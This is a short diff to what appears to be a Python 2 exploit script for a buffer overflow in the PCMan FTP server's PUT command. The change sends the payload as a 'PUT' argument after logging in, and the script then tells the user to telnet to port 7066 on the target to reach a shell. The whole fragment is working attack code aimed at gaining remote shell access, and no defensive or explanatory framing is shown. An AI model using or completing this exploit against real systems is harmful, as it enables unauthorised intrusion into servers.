@@ -90,5 +90,5 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     s.recv(1024)
     s.send("PASS " + self.passwd[0])
     s.recv(1024)
-    s.send(payload)
+    s.send("PUT " + payload)
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
